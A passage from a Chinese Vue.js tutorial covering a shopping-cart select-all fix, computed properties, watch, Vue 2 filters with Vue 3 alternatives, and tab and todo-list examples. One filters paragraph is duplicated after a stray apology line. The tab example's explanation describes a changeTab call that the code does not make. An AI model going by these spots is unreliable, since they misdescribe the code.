            poster: "https://p0.meituan.net/moviemachine/3084e88f63eef2c6a0df576153a3fad0327782.jpg@1l_1e_1c_128w_180h",
            limit: 6
          },
          {
            id: 3,
            title: "商品3",
            price: 30,
            number: 3,
            poster: "https://p0.meituan.net/movie/897b8364755949226995144bfc2261ee4493381.jpg@1l_1e_1c_128w_180h",
            limit: 7
          }
        ] // 商品列表
      }
    },
    methods:{
      sum(){
        // 计算选中的商品总金额
        return this.checkList.reduce((total,item)=>total+item.price*item.number,0)
      },

      // 处理删除商品的逻辑
      handleDel(index,id){
        // 从datalist数组中删除对应的商品
        this.datalist.splice(index,1)
        // 从已选中的商品列表checkList中删除对应的商品
        this.checkList = this.checkList.filter(item=>item.id!==id)
        // 检查是否需要更新全选复选框的状态
        this.handleItemChange()
      },
      // 处理全选复选框状态改变的逻辑
      handleAllChange(){
        // 如果全选复选框被选中，则将所有商品添加到checkList中，否则清空checkList
        this.checkList = this.isAllChecked?this.datalist:[]
      },

      // 处理商品复选框状态改变的逻辑
      handleItemChange(){
        // 如果所有商品都被选中，则全选复选框也被选中，否则全选复选框不被选中
        this.isAllChecked = this.checkList.length===this.datalist.length
      }
    }
  }
  var app = Vue.createApp(obj).mount("#box")
</script>
</body>

</html>
```

![iShot_2023-07-01_23.53.58](https://billy.taoxiaoxin.club/md/2023/07/64a04d5e922ee43c0f320a56.gif)

### 10.8 购物车案例(全选与全不选)

在上面的代码有个问题,当用户选中了购物车中的商品时候,然后又不想要了,点击了删除,所以这个时候,购物车的全选不应该被选中,即当 `datalist` 为空（即购物车中没有商品）时，全选按钮将也被选中，这并不符合预期。

全选按钮的逻辑在某些情况下可能会有问题。具体来说，这个问题出在 `handleAllChange` 方法和 `handleItemChange` 方法之间的交互上。

当用户点击全选按钮时，`handleAllChange` 方法会被触发，如果全选按钮被选中，所有的商品都会被添加到 `checkList` 中，否则 `checkList` 会被清空。这部分逻辑是正确的。

但问题在于 `handleItemChange` 方法。这个方法在任何一个商品的选中状态发生改变时都会被调用，它会检查 `checkList` 中的商品数量是否等于 `datalist` 中的商品数量，如果相等，则会将 `isAllChecked` 设置为 `true`，否则设置为 `false`。这意味着，当用户取消选择任何一个商品时，全选按钮也会被取消选择，这是符合预期的。然而，当 `datalist` 为空（即购物车中没有商品）时，由于 0 等于 0，全选按钮将被选中，这并不符合预期，用户可能会认为全选按钮被选中意味着有商品被选中。

要解决这个问题，你需要在 `handleItemChange` 方法中添加一个检查，当 `datalist` 为空时，全选按钮应保持未选中状态。例如：

```js
handleItemChange(){
  // 如果购物车中没有商品，全选按钮不被选中，否则检查是否所有商品都被选中
  this.isAllChecked = this.datalist.length === 0 ? false : this.checkList.length === this.datalist.length
}
```

以下是代码的优化后的完整版本:

```vue
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>购物车案例</title>
  <script src="vue.js"></script>
  <style>
    li {
      display: flex;
      justify-content: space-between;
      align-items: center;
      padding: 10px;
      border: 1px solid lightgray;
    }

    li img {
      width: 100px;
    }
  </style>
</head>

<body>
<div id="box">
  <ul>
    <!-- 一个可选择全选或全不选的复选框 -->
    <li>
      <div>
        <!-- v-model绑定到isAllChecked变量上，并在改变时调用handleAllChange方法-->
        <input type="checkbox" v-model="isAllChecked" @change="handleAllChange">
        <span>全选/全不选</span>
      </div>
    </li>
    <!-- 如果datalist数组不为空，则显示商品列表 -->
    <template v-if="datalist.length">
      <li v-for="(item,index) in datalist" :key="item.id" >
        <div>
          <!-- 绑定复选框的状态到checkList数组上，并在复选框状态改变时调用handleItemChange方法 -->
          <input type="checkbox" v-model="checkList" :value="item" @change="handleItemChange">
        </div>
        <div>
          <!-- 显示商品图片 -->
          <img :src="item.poster" alt="">
        </div>
        <div>
          <!-- 显示商品标题和价格 -->
          <div>{{item.title}}</div>
          <div style="color:red;">价格:{{item.price}}</div>
        </div>

        <div>
          <!-- 添加按钮进行商品数量的加减 -->
          <button @click="item.number--" :disabled="item.number===1">-</button>
          {{item.number}}
          <button @click="item.number++" :disabled="item.number===item.limit">+</button>
        </div>

        <div>
          <!-- 添加按钮进行商品的删除 -->
          <button @click="handleDel(index,item.id)">删除</button>
        </div>
      </li>
    </template>

    <!-- 如果datalist数组为空，则显示购物车空空如也 -->
    <li v-else>购物车空空如也</li>

    <!-- 显示总金额 -->
    <li>
      <div>总金额:{{ sum() }}</div>
    </li>
  </ul>

  <!-- 输出已选中的商品列表checkList，以方便调试 -->
  {{checkList}}
</div>
<script>
  var obj = {
    data() {
      return {
        isAllChecked:false, // 全选或全不选的状态
        checkList:[], // 勾选的商品列表
        datalist: [
          {
            id: 1,
            title: "商品1",
            price: 10,
            number: 1,
            poster: "https://p0.meituan.net/movie/dc2fed6001e809e4553f90cc6fad9a59245170.jpg@1l_1e_1c_128w_180h",
            limit: 5
          },
          {
            id: 2,
            title: "商品2",
            price: 20,
            number: 2,
            poster: "https://p0.meituan.net/moviemachine/3084e88f63eef2c6a0df576153a3fad0327782.jpg@1l_1e_1c_128w_180h",
            limit: 6
          },
          {
            id: 3,
            title: "商品3",
            price: 30,
            number: 3,
            poster: "https://p0.meituan.net/movie/897b8364755949226995144bfc2261ee4493381.jpg@1l_1e_1c_128w_180h",
            limit: 7
          }
        ] // 商品列表
      }
    },
    methods:{
      sum(){
        // 计算选中的商品总金额
        return this.checkList.reduce((total,item)=>total+item.price*item.number,0)
      },

      // 处理删除商品的逻辑
      handleDel(index,id){
        // 从datalist数组中删除对应的商品
        this.datalist.splice(index,1)
        // 从已选中的商品列表checkList中删除对应的商品
        this.checkList = this.checkList.filter(item=>item.id!==id)
        // 检查是否需要更新全选复选框的状态
        this.handleItemChange()
      },
      // 处理全选复选框状态改变的逻辑
      handleAllChange(){
        // 如果全选复选框被选中，则将所有商品添加到checkList中，否则清空checkList
        this.checkList = this.isAllChecked?this.datalist:[]
      },

      // 处理商品复选框状态改变的逻辑
      handleItemChange(){
        // 如果购物车中没有商品，全选按钮不被选中，否则检查是否所有商品都被选中
        if(this.datalist.length===0){
          this.isAllChecked = false
          return
        }
        // 如果所有商品都被选中，则全选复选框也被选中，否则全选复选框不被选中
        this.isAllChecked = this.checkList.length===this.datalist.length
      }
    }
  }
  var app = Vue.createApp(obj).mount("#box")
</script>
</body>
</html>
```

![iShot_2023-07-02_00.18.11](https://billy.taoxiaoxin.club/md/2023/07/64a05231922ee4411251ce36.gif)

## 十一、计算属性

模板中的表达式虽然方便，但也只能用来做简单的操作。如果在模板中写太多逻辑，会让模板变得臃肿，难以维护。因此我们推荐使用**计算属性**来描述依赖响应式状态的复杂逻辑。

### 11.1 基本介绍与使用

计算属性是一种特殊类型的 Vue 实例属性。计算属性与常规 Vue 实例数据属性的主要区别在于，计算属性是基于其它数据属性动态计算和生成的。其主要特点如下：

1. 计算属性的值是由一个函数计算得出的，这个函数就是我们定义在 `computed` 选项中的函数。
2. Vue.js 知道计算属性依赖哪些数据，所以当依赖项发生变化时，计算属性会重新计算值。
3. 计算属性是基于它们的依赖关系缓存的。只有在相关依赖发生改变时，才会重新计算新的值。这就意味着如果计算属性的依赖（例如，data 属性或其它计算属性）没有改变，那么访问计算属性将返回之前计算的结果，而不是重新执行函数。

比如说，我们有这样一个包含嵌套数组的对象：

```js
<script >
  var obj = {
    data() {
      return {
        author: {
          name: 'John Doe',
          books: [
            'Vue 2 - Advanced Guide',
            'Vue 3 - Basic Guide',
            'Vue 4 - The Mystery'
          ]
        }
      }
    }
  }
  var app = Vue.createApp(obj).mount('#app')
</script>
```

我们想根据 `author` 是否已有一些书籍来展示不同的信息：

```vue
<p>Has published books:</p>
<span>{{ author.books.length > 0 ? 'Yes' : 'No' }}</span>
```

这里的模板看起来有些复杂。我们必须认真看好一会儿才能明白它的计算依赖于 `author.books`。更重要的是，如果在模板中需要不止一次这样的计算，我们可不想将这样的代码在模板里重复好多遍。

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Vue 基本介绍与使用</title>
</head>
<script src="vue.js"></script>
<body>
  <div id="app">
    <p>Has published books:</p>
    <span>{{ author.books.length > 0 ? 'Yes' : 'No' }}</span>
  </div>
  <script >
    var obj = {
      data() {
        return {
          author: {
            name: 'John Doe',
            books: [
              'Vue 2 - Advanced Guide',
              'Vue 3 - Basic Guide',
              'Vue 4 - The Mystery'
            ]
          }
        }
      },
      computed: {
        // 一个计算属性的 getter
        publishedBooksMessage() {
          // `this` 指向当前组件实例
          return this.author.books.length > 0 ? 'Yes' : 'No'
        }
      }
    }
    var app = Vue.createApp(obj).mount('#app')
  </script>
</body>
</html>
```

小练习：两个数值相加，计算出结果

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="https://unpkg.com/vue@next"></script> <!-- 引入 Vue 3 版本的库 -->
</head>
<body>
<div id="app">
    <input type="text" v-model="num1">+ <!-- v-model 用于数据双向绑定 -->
    <input type="text" v-model="num2">= <!-- v-model 用于数据双向绑定 -->
    <span>{{total}}</span> <!-- 使用计算属性 total -->
</div>

<script>
    const obj = {
        data() { // 定义应用的数据
            return {
                num1: 0, // 第一个输入框的数值
                num2: 0, // 第二个输入框的数值
            }
        },
        computed: { // 计算属性
            total() { // 计算属性 total，用于计算两个输入框的数值之和
                // parseFloat 将数值转换为浮点数
                return parseFloat(this.num1) + parseFloat(this.num2);
            }
        }
    };
    const app = Vue.createApp(obj).mount('#app') // 创建并挂载 Vue 应用
</script>
</body>
</html>

```

计算属性的复杂操作：

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>计算属性的复杂操作</title>
  <script src="vue.js"></script> <!-- 加载 Vue.js 库 -->
</head>
<body>

<div id="app"><!-- Vue 应用挂载的元素 -->
  <!-- 以下两种方式分别展示了通过计算属性和方法获取书籍总价格 -->
  <h2>总价格: {{totalPrice}}</h2> <!-- 通过计算属性获取总价格 -->
  <h2>总价格: {{totalPrice}}</h2>
  <h2>总价格: {{totalPrice}}</h2>
  <h2>总价格: {{totalPrice}}</h2>

  <h2>总价格: {{getTotalPrice()}}</h2> <!-- 通过方法获取总价格 -->
  <h2>总价格: {{getTotalPrice()}}</h2>
  <h2>总价格: {{getTotalPrice()}}</h2>
  <h2>总价格: {{getTotalPrice()}}</h2>
</div>

<script>
  const obj = { // 创建 Vue 应用的配置对象
    data() { // 定义应用的响应式数据
      return {
        books: [ // 一个包含书籍的数组，每本书都有一个 id、名称和价格
          {id: 110, name: 'Unix编程艺术', price: 119},
          {id: 111, name: '代码大全', price: 105},
          {id: 112, name: '深入理解计算机原理', price: 98},
          {id: 113, name: '现代操作系统', price: 87},
        ]
      }
    },
    methods: { // 定义应用的方法
      getTotalPrice() { // 定义一个方法，计算并返回书籍总价格
        let result = 0
        for (let i=0; i < this.books.length; i++) {
          result += this.books[i].price
        }
        return result
      }
    },
    computed: { // 定义应用的计算属性
      totalPrice() { // 定义一个计算属性，计算并返回书籍总价格
        let result = 0
        for (let i=0; i < this.books.length; i++) {
          result += this.books[i].price
        }
        return result
      }
    }
  }
  // 使用 Vue.createApp 创建应用，并使用 mount 方法将应用挂载到 #app 元素上
  const app = Vue.createApp(obj).mount('#app')
</script>

</body>
</html>

```

若我们将同样的函数定义为一个方法而不是计算属性，两种方式在结果上确实是完全相同的，然而，不同之处在于**计算属性值会基于其响应式依赖被缓存**。一个计算属性仅会在其响应式依赖更新时才重新计算。

### 11.2 **计算属性的缓存**

我们可能会考虑这样的一个问题：

+ `methods`和`computed`看起来都可以实现我们的功能.
+ 那么为什么还要多一个计算属性这个东西呢？

**原因：计算属性会进行缓存，如果多次使用时，计算属性只会调用一次。**

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
</head>
<script src="vue.js"></script> <!-- 引入 Vue 3 版本的库 -->
<body>

<div id="app">
  <!-- 直接拼接，语法繁琐 -->
  <h2>{{firstName}} {{lastName}}</h2>

  <!-- 通过computed，计算属性有缓存效果 -->
  <h2>{{fullName}}</h2>
  <h2>{{fullName}}</h2>
  <h2>{{fullName}}</h2>
  <h2>{{fullName}}</h2>
</div>

<script>
  var obj = {
    data() {
      return {
        firstName: 'Kobe',
        lastName: 'Bryant'
      }
    },
    computed: {
      fullName() {
        console.log('fullName'); // 每次 fullName 计算时会打印
        return this.firstName + ' ' + this.lastName // 计算 firstName 和 lastName 的拼接
      }
    }
  }
  var app = Vue.createApp(obj).mount('#app') // 创建并挂载 Vue 应用

</script>

</body>
</html>
```

### 11.3 计算属性的setter和getter

在 Vue 中，**计算属性默认只有 getter，不过你也可以提供一个 setter。**

**Getter** 是当你访问计算属性时调用的函数，例如 `{{ fullName }}`。

**Setter** 是当你尝试改变计算属性的值时调用的函数，例如 `this.fullName = 'New Name'`。

下面是一个计算属性同时具有 getter 和 setter 的例子：

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Title</title>
</head>
<body>
<div id="app">
  <h2>{{fullName}}</h2>
  <input v-model="fullName"> <!-- 输入框，和 fullName 绑定 -->
</div>

<script src="vue.js"></script> <!-- 引入 Vue 3 的库 -->
<script>
  var obj = {
    data() {
      return {
        firstName: 'Kobe',
        lastName: 'Bryant'
      }
    },
    computed: {
      fullName: {
        // getter，当我们尝试获取 fullName 的值时被调用
        get() {
          return this.firstName + ' ' + this.lastName
        },
        // setter，当我们尝试设置 fullName 的值时被调用
        set(newValue) {
          [this.firstName, this.lastName] = newValue.split(' ')
          console.log(this.firstName, this.lastName)
        }
      }
    }
  }
  var app = Vue.createApp(obj).mount('#app'); // 创建并挂载 Vue 应用
</script>

</body>
</html>
```

### 11.4 计算属性注意事项

计算属性在 Vue 中的使用确实应该遵循一些最佳实践。

1. **Getter 不应有副作用**：计算属性的 Getter 应当是一个纯函数，也就是说，相同的输入应当产生相同的输出，并且不产生任何副作用。这是因为计算属性是缓存的，Vue 内部会跟踪其依赖的响应式属性，只有当这些依赖项改变时，才会重新计算。如果 Getter 有副作用，那么它可能会在你不期望的时候被执行，或者在你期望它执行时并没有被执行。
2. **避免直接修改计算属性值**：虽然 Vue 允许我们为计算属性定义 setter，但我们一般不建议这么做。计算属性应当是源状态的派生状态，我们应当通过更改源状态来间接地更改派生状态，而不是直接更改派生状态。如果我们需要在用户输入时更新源状态，我们应当使用 v-model 搭配计算属性的 getter 和 setter，而不是直接修改计算属性的值。

这些原则有助于我们写出更易于理解和维护的代码，因为它们保证了数据的单向流动和状态的唯一数据源，使我们的应用更容易预测。

## 十二、watch 侦听属性

计算属性允许我们声明性地计算衍生值。然而在有些情况下，我们需要在状态变化时执行一些“副作用”：例如更改 DOM，或是根据异步操作的结果去修改另一处的状态。

在Vue中，我们可以使用 `watch`在每次响应式属性发生变化时触发一个函数,可以帮助我们侦听某个数据的变化，从而做相应的自定义操作。

### 12.1 Watch 侦听属性的基本语法：

在 Vue.js 中，你可以通过在 Vue 实例的 `watch` 选项中定义一个或多个侦听属性来监视数据的变化。侦听属性可以是数据对象中的某个属性，也可以是计算属性。基本的语法如下：

```js
watch: {
  propertyName: {
    handler(newValue, oldValue) {
      // 执行相应的操作
    },
    deep: false, // 可选，是否深度监视对象内部属性的变化，默认为 false
    immediate: false // 可选，是否在初始化时立即执行回调函数，默认为 false
  }
}
```

- `propertyName`：要侦听的属性名。
- `handler`：当属性变化时要执行的回调函数，接收两个参数：新值 `newValue` 和旧值 `oldValue`。
- `deep`：可选参数，表示是否深度监视对象内部属性的变化，默认为 `false`。如果需要监视对象内部属性的变化，可以设置为 `true`。
- `immediate`：可选参数，表示是否在初始化时立即执行回调函数，默认为 `false`。如果需要在初始化时执行回调函数，可以设置为 `true`。

案例一:模拟接口异步请求

```vue
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <script src="vue.js"></script>
</head>
<body>
<div id="box">
  <!-- 通过 v-model 将输入框与 mytext 数据属性进行双向绑定 -->
  <input type="text" v-model="mytext" >
  <ul>
    <!-- 使用 v-for 遍历 datalist 数组，生成列表项 -->
    <li v-for="item in datalist" :key="item" >
      {{item}}
    </li>
  </ul>
</div>

<script>
  var obj  ={
    data(){
      return {
        mytext:"", // 输入框的文本值
        datalist:["aaa","abb","aab","bcc","abc","bcd","add","acd"], // 原始数据列表
        baklist:["aaa","abb","aab","bcc","abc","bcd","add","acd"] // 备份原始数据列表
      }
    },

    watch:{
      mytext(value,oldvalue){
        console.log(value)
        // 使用 setTimeout 模拟异步操作，2秒后更新 datalist
        setTimeout(()=>{
          // 根据输入的文本值，通过 filter 进行筛选，并更新 datalist
          this.datalist = this.baklist.filter(item=>item.includes(this.mytext))
        },2000)
      }
    },
  }
  // 创建 Vue 应用程序实例，并挂载到 id 为 "box" 的元素上
  Vue.createApp(obj).mount("#box")
</script>
</body>
</html>

```

案例二:对象深层侦听和即时回调

```vue
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <script src="vue.js"></script>
</head>

<body>
<div id="box">
  <!-- 通过 v-model 将输入框与 mytext 数据属性进行双向绑定 -->
  <input type="text" v-model="mytext">
  <!-- 使用 v-model 将下拉框与 obj.year 数据属性进行双向绑定 -->
  <select v-model="obj.year">
    <option value="2021">2021</option>
    <option value="2022">2022</option>
    <option value="2023">2023</option>
    <option value="2024">2024</option>
  </select>
  <!-- 使用 v-model 将下拉框与 obj.month 数据属性进行双向绑定 -->
  <select v-model="obj.month">
    <option value="10">10</option>
    <option value="11">11</option>
    <option value="12">12</option>
  </select>
  <!-- 使用 v-model 将下拉框与 obj.day 数据属性进行双向绑定 -->
  <select v-model="obj.day">
    <option value="31">31</option>
    <option value="1">1</option>
    <option value="2">2</option>
  </select>
</div>

<script>
  var obj = {
    data() {
      return {
        mytext: "", // 输入框的文本值
        obj: { // 包含年、月、日的数据对象
          year: 2023,
          month: 12,
          day: 31
        }
      }
    },

    watch: {
      mytext: "anyfunc", // 通过字符串指定要调用的方法名作为侦听属性的回调函数

      obj: { // 侦听 obj 对象的变化
        handler(value) { // 侦听属性回调函数，接收参数 value，表示 obj 对象的新值
          console.log(value, "ajax") // 执行相应的操作，这里仅输出新值和 "ajax" 字符串
        },
        deep: true, // 深度监听 obj 对象的内部属性变化
        immediate: true // 在初始化时立即执行侦听属性的回调函数
      }
    },
    methods: {
      anyfunc(value, oldvalue) { // 侦听属性的回调函数，接收参数 value 和 oldvalue，分别表示新值和旧值
        console.log(value) // 执行相应的操作，这里仅输出新值
      }
    }
  }
  // 创建 Vue 应用程序实例，并将定义的对象 `obj` 作为参数传递给 `createApp` 方法。然后，将实例挂载到 id 为 "box" 的元素上，使应用程序生效。
  Vue.createApp(obj).mount("#box")
</script>
</body>

</html>

```

## 十三、过滤器

**在 Vue 3 中，Vue 团队已经弃用了过滤器，这是一个重要的变化。在 Vue 2 中，我们通常用过滤器来实现一些简单的文本格式化。**过滤器在 Vue 2 中是一个非常有用的特性，允许开发者在模板中改变或格式化数据的展示方式，而不改变底层数据本身。过滤器可以在两个地方使用：插值表达式和 v-bind 表达式。

在Vue 2 中定义过滤器的方式有两种：**全局过滤器和局部过滤器**。

### 13.1 全局过滤器：

在主 Vue 文件中，可以**使用 Vue.filter 方法创建全局过滤器**：

+ 定义在被过滤对象Vue实例化之前. 一般作为js文件导入

```js
    Vue.filter('过滤器名', fuction(参数1, 参数2, ...) {
        过滤数据的逻辑代码
        return 过滤以后的结果;
    })
```

举个例子,四舍五人小数点

```js
// 使用: 一般用作js外部文件导入使用
// 注意: 如果需要展示数据而实例化Vue对象数据之前.  也就是说js文件的导入, 要先与过滤展示数据的Vue对象实例化之前.
Vue.filter('format', function (money) {
    return money.toFixed(2) + '元';   // js中提供了一个toFixed方法可以保留2位小鼠. (四舍五入)
});
```

完整示例代码：

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2"></script>
    <script src="filters.js"></script>
</head>
<body>
<div id="app">
    <p>{{price}}</p>
    <!-- price会当作参数传给format函数, 最终以函数的返回值作为最终的返回结果 -->
    <p>{{price|format}}</p>
</div>

<script>
    let vm = new Vue({
        el: '#app',  // vm的模板对象
        data: {      // vm的数据
            price: 8.156333,
        },
        methods: {}  // vm的方法
    });
</script>
<!--注意: 不能放到这个位置-->    
<!--<script src="filters.js"></script>-->
</body>
</html>
```

- filters.js文件中代码

```js
// 全局过滤器
Vue.filter('format', function(money) {
    return money.toFixed(2) + '元';   // js中提供了一个toFixed方法可以保留2位小鼠. (四舍五入)
});
```

以上代码实现效果如下:

![image-20230626213043031](https://billy.taoxiaoxin.club/md/2023/06/64999303922ee44ff9c3fd73.png)

### 13.2 局部过滤器：

在 Vue 组件内部，**可以在 `filters` 属性中定义过滤器**：

+ 定义在Vue对象内部. 只能争对当前所在的Vue对象实例化以后vm对象的数据进行过滤

```js
    let vm = new Vue({
        el: '',
        data: {},
        methods: {},
        filters: {
            过滤器名(参数1, 参数2, ...) {
                过滤数据的逻辑代码
                return 过滤以后的结果;
            }
        }
    });
```

使用局部过滤器四舍五入小数点:

```js
// 注意: 局部过滤器, 只能争对其Vue实例化的对象数据进行的过滤
filters: {
    format(money) {
        return `${money.toFixed(2)}元`;
    }
}
```

完整示例代码：

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script src="https://cdn.jsdelivr.net/npm/vue@2"></script>
</head>
<body>
<div id="app">
    <p>{{price}}</p>
    <p>{{price|format}}</p>
    <p>{{price|format1}}</p>
</div>

<script>
    let vm = new Vue({
        el: "#app",  // vm的模板对象
        data: {      // vm的数据
            price: 8.156333,
        },
        methods: {}, // vm的方法

        // 局部过滤器只能在当前vm对象中使用
        filters: {
            format(money) {
                return `${money.toFixed(2)}元`;
            }
        }
     });

    // 注意: 局部过滤器, 只能争对其Vue实例化的对象数据进行的过滤
    let vm1 = new Vue({
       el: '#app',
       data: {},
       filters: {
            format1(money) {
                return `${money.toFixed(2)}元`;
            }
        }
    });
</script>
</body>
</html>
```

### 13.3 注意:过滤器, 一定要指定返回值

在 Vue 中的过滤器应该是一个函数，而且这个函数一定要有返回值。这是因为过滤器的目的就是对输入值进行一些操作，然后返回新的值。这个新的值将会被 Vue 用来替换原来的值。

例如，在以下的过滤器中，我们将输入的字符串转换为大写：

```js
Vue.filter('uppercase', function(value) {
  return value.toUpperCase();
});
```

在这个例子中，`toUpperCase` 方法将输入的字符串 `value` 转换为大写，然后返回这个新的大写字符串。这个返回的大写字符串将会被 Vue 用来替换模板中的原始字符串。

如果一个过滤器没有返回值，那么 Vue 将会把这个过滤器的结果视为 `undefined`，这可能会导致预期之外的行为。因此，一个过滤器必须有返回值。

完整示例代码:

```vue
<!DOCTYPE html>
<html>
<head>
    <script src="https://cdn.jsdelivr.net/npm/vue@2"></script>
</head>
<body>
    <div id="app">
        <!-- 使用全局过滤器 uppercase -->
        <p>{{ message | uppercase }}</p>
        <!-- 使用全局过滤器 noReturn -->
        <p>{{ message | noReturn }}</p>
    </div>

    <script>
        // 定义全局过滤器
        Vue.filter('uppercase', function(value) {
            // 将输入的字符串转换为大写并返回
            return value.toUpperCase();
        });

        Vue.filter('noReturn', function(value) {
            // 对输入的字符串进行操作但不返回任何值
            value.split('').reverse().join('');
            // 由于没有返回值，Vue 将会把这个过滤器的结果视为 undefined
        });

        new Vue({
            el: '#app',
            data: {
                message: 'hello world!'
            }
        });
    </script>
</body>
</html>
```

### 13.4 Vue 3 中实现过滤器

前面讲到,在 Vue 3 中，Vue 团队已经弃用了过滤器。这是因为它们认为过滤器可能会引起一些不必要的混淆，尤其是对于那些初次接触 Vue 的开发者。因此，你在 Vue 3 中找不到过滤器这个概念。

然而，你仍然可以在 Vue 3 中实现类似过滤器的功能。Vue 3 提倡使用计算属性（computed property）或者方法（methods）来达到过滤器在 Vue 2 中的效果。

例如，如果你在 Vue 2 中有一个过滤器用来将字符串转换为大写，你可以在 Vue 3 中使用一个计算属性或方法来达到同样的效果。


很抱歉，我需要纠正一点误解。在 Vue 3 中，Vue 团队已经弃用了过滤器。这是因为它们认为过滤器可能会引起一些不必要的混淆，尤其是对于那些初次接触 Vue 的开发者。因此，你在 Vue 3 中找不到过滤器这个概念。

然而，你仍然可以在 Vue 3 中实现类似过滤器的功能。Vue 3 提倡使用计算属性（computed property）或者方法（methods）来达到过滤器在 Vue 2 中的效果。

例如，如果你在 Vue 2 中有一个过滤器用来将字符串转换为大写，你可以在 Vue 3 中使用一个计算属性或方法来达到同样的效果。

在 Vue 2 中：

````js
filters: {
  uppercase(value) {
    return value.toUpperCase()
  }
}
````

在 Vue 3 中可以这样做：

```js
computed: {
  uppercaseValue() {
    return this.value.toUpperCase()
  }
}

```

或者这样做：

```js
methods: {
  uppercase(value) {
    return value.toUpperCase()
  }
}

```

在 Vue 3 中，采用这种方式可以达到相同的效果，但是与过滤器相比，计算属性和方法更加灵活和强大。你可以在任何地方使用它们，而不仅仅是在模板中，这使得它们更加具有可复用性。

## 十三、小案例

### 案例一:实现一个选项卡

需求: 当用户点击标题栏的按钮[span]时，显示对应索引下标的内容块[.list]

思路：利用标题栏每一个标题和内容对应的序号来记录和控制它们的显示和隐藏

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <style>
        /* 设置卡片的宽度和高度 */
        #card {
            width: 500px;
            height: 400px;
        }

        /* 标题栏样式 */
        .title {
            height: 50px;
        }

        /* 标题样式 */
        .title span {
            width: 100px;
            height: 50px;
            background-color: #ccc;
            display: inline-block;
            line-height: 50px;
            text-align: center;
        }

        /* 内容块样式 */
        .content .list {
            width: 500px;
            height: 350px;
            background-color: yellow;
            display: none;
        }

        /* 显示内容块样式 */
        .content .active {
            display: block;
        }

        /* 当前选中标题样式 */
        .title .current {
            background-color: yellow;
        }
    </style>
    <script src="vue.js"></script>
</head>
<body>

<div id="card">
    <div class="title">
        <!-- 标题栏 -->
        <span @click="num=0" :class="num==0 ? 'current' : ''">国内新闻</span>
        <span @click="num=1" :class="num==1 ? 'current' : ''">国际新闻</span>
        <span @click="num=2" :class="num==2 ? 'current' : ''">银河新闻</span>
    </div>
    <div class="content">
        <!-- 内容块 -->
        <div class="list" :class="num==0 ? 'active' : ''">国内新闻列表</div>
        <div class="list" :class="num==1 ? 'active' : ''">国际新闻列表</div>
        <div class="list" :class="num==2 ? 'active' : ''">银河新闻列表</div>
    </div>
</div>
<script>
    var card = {
        data() {
            return {
                num: 0,
            }
        },
        methods: {
            changeTab(index) {
                this.num = index;
            }
        }
    };

    Vue.createApp(card).mount("#card");
</script>

</body>
</html>

```

展示图：

![测试](https://billy.taoxiaoxin.club/md/2023/06/6480735f922ee47da5247f62.gif)

通过这段代码实现了一个简单的选项卡功能，用户可以点击标题栏中的按钮来切换显示不同的内容块。以下是代码的思路解释：

1. 在HTML中，我们有一个包含标题栏和内容块的容器，使用`id`属性为`card`。
2. 标题栏部分由一组`<span>`元素组成，每个`<span>`元素都有一个点击事件绑定，通过`@click`指令调用`changeTab`方法，并根据当前选中的索引为按钮添加`current`类名。
3. 内容块部分也是一组`<div>`元素，通过使用`:class`指令和条件表达式来判断是否添加`active`类名，控制内容块的显示与隐藏。
4. 在JavaScript部分，我们定义了一个名为`card`的对象。
5. `card`对象包含一个`data`属性，用于存储当前选中的索引，初始值为0。
6. `card`对象还包含一个`methods`属性，其中定义了一个名为`changeTab`的方法。
7. `changeTab`方法接受一个参数`index`，用于更新`num`属性的值为传入的索引值，以便显示对应的内容块。
8. 最后，我们使用`Vue.createApp`方法创建一个Vue应用，并将`card`对象作为配置选项进行挂载，指定挂载的目标为`#card`，即我们在HTML中定义的容器元素。
9. 当用户点击标题栏的按钮时，触发点击事件，调用`changeTab`方法来切换选中的索引，从而实现显示对应的内容块。

通过这样的实现，用户可以根据需要切换显示不同的内容块，达到简单的选项卡功能。

### 案例二:Todolist 案例

需求:实现的简单的 Todolist（待办事项列表）案例,点击按钮add 可以添加,点击del可以删除

```vue
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Todolist 案例</title>
    <script src="vue.js"></script>
</head>

<body>
<div id="box">
    <!-- 双向绑定的指令，将输入框的值和数据对象中的 mytext 属性进行双向绑定 -->
    <input type="text" v-model="mytext">
    <button @click="handleAdd">add</button>

    <ul>
        <!-- 使用 v-for 指令遍历 datalist 数组，将每个元素渲染为列表项 -->
        <li v-for="item,index in datalist">
            <!-- 显示待办事项的内容 -->
            {{item}}

            <!-- 点击按钮触发 handleDel 方法删除对应的待办事项 -->
            <button @click="handleDel(index)">del</button>
        </li>
    </ul>

    <!-- 当待办事项列表为空时显示的提示信息 -->
    <div v-show="datalist.length===0">暂无待办事项</div>
</div>
<script>
    // 创建 Vue 实例
    var obj = {
        data() {
            // 数据对象，包含待办事项的输入框值和待办事项列表的数据
            return {
                mytext: "",                    // 输入框的值
                datalist:["11","22","33"],     // 待办事项列表的数据
            }
        },
        methods:{
            // 添加待办事项的方法
            handleAdd(){
                console.log("add",this.mytext)
                this.datalist.push(this.mytext)   // 将输入框的值添加到待办事项列表

                // 清空输入框
                this.mytext = ""
            },
            // 删除待办事项的方法
            handleDel(index){
                console.log("del",index)

                this.datalist.splice(index,1)     // 从待办事项列表中删除指定索引位置的项
            }
        }
    }
